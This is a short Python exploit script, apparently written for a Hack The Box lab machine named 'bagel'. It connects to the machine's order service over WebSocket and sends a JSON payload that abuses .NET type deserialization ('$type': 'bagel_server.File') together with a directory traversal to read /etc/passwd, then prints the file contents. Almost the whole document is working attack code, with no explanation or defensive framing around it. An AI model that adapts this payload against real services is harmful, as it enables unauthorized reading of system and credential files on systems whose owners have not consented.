#!/usr/bin/env python

# pip install websocket-client
import websocket
import json


ws = websocket.WebSocket()    
ws.connect("ws://bagel.htb:5000/") # connect to order app
order = {"ReadOrder":"orders.txt"}

order = {
        "RemoveOrder": {
                "$type": "bagel_server.File, bagel",
                "ReadFile": "../../../../../../etc/passwd"
        }
        
}

data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
#print(result)
print(json.loads(result)['RemoveOrder']['ReadFile'])